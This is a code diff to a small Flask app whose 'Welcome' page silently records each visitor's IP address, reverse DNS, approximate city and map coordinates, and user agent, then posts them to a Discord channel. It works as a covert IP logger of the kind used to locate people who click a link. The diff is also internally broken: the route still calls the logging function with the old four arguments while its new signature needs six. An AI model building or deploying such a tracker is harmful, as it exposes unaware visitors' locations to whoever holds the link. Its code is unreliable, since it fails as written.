@@ -15,19 +15,37 @@ def get_visitor_ip():
         return fwd.split(",")[0].strip()
     return request.remote_addr
 
-#def get_reverse_dns(ip):
-#    try:
-#       return socket.gethostbyaddr(ip)[0]
-#    except (socket.herror, socket.gaierror):
- #       return "no reverse DNS"
+def get_geolocation(ip):
+    # Uses the free ip-api.com service (no key). City/region-level only.
+    try:
+        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
+        data = r.json()
+        if data.get("status") == "success":
+            city = data.get("city", "?")
+            region = data.get("regionName", "?")
+            country = data.get("country", "?")
+            lat = data.get("lat")
+            lon = data.get("lon")
+            maps_link = f"https://www.google.com/maps?q={lat},{lon}"
+            return f"{city}, {region}, {country}", maps_link
+        return "unknown location", "no map"
+    except requests.RequestException:
+        return "lookup failed", "no map"
 
-def log_to_discord(ip, path, user_agent):  
- #   log_to_discord(ip, rdns, path, user_agent):# <-- rdns added here
+def get_reverse_dns(ip):
+    try:
+       return socket.gethostbyaddr(ip)[0]
+    except (socket.herror, socket.gaierror):
+       return "no reverse DNS"
+
+def log_to_discord(ip, rdns, location, maps_link, path, user_agent):  
     payload = {
         "content": (
             f"**New visit**\n"
             f"IP: `{ip}`\n"
-        #    f"Reverse DNS: `{rdns}`\n"
+            f"Reverse DNS: `{rdns}`\n"
+            f"Approx. location: {location}\n"
+            f"Map: {maps_link}\n"
             f"Path: `{path}`\n"
             f"User-Agent: `{user_agent}`"
         )
@@ -42,7 +60,8 @@ def log_to_discord(ip, path, user_agent):
 @app.route("/")
 def home():
     ip = get_visitor_ip()
-  #  rdns = get_reverse_dns(ip)
+    rdns = get_reverse_dns(ip)
+    location, maps_link = get_geolocation(ip)
     log_to_discord(ip, rdns, request.path, request.headers.get("User-Agent", "unknown"))
     return render_template_string("""
         <h1>Welcome</h1>
